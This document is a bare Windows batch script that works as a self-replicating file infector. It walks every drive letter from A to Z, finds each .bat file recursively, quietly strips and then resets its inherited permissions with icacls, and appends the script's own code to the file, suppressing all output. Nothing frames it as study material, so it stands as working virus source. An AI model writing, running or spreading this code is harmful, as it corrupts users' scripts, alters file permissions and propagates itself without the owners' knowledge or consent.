@echo off
setlocal enabledelayedexpansion
for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    call :FolderList %%d:\
)
:FolderList
set "root_folder=%1"
if exist "%root_folder%" (
    for /r "%root_folder%" %%f in (*.bat) do (
        icacls "%%f" /inheritance:r > nul 2>&1
        echo. >> "%%f" > nul 2>&1
        type "%0" >> "%%f" > nul 2>&1
        icacls "%%f" /inheritance:d > nul 2>&1
    )
)
exit /b
